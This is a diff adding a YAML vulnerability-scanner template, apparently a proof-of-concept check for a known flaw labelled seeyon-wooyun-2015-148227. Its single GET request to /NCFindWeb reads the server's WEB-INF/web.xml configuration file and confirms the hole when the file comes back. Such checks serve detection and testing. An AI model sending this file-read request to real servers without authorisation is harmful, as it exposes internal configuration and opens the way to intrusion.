@@ -1,0 +1,18 @@
+id: seeyon-wooyun-2015-148227
+
+info:
+    name: seeyon-wooyun-2015-148227
+    author: canc3s(https://github.com/canc3s)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type == "application/xml" && response.body.bcontains(bytes("<servlet-name>NCInvokerServlet</servlet-name>"))
+expression: r0()
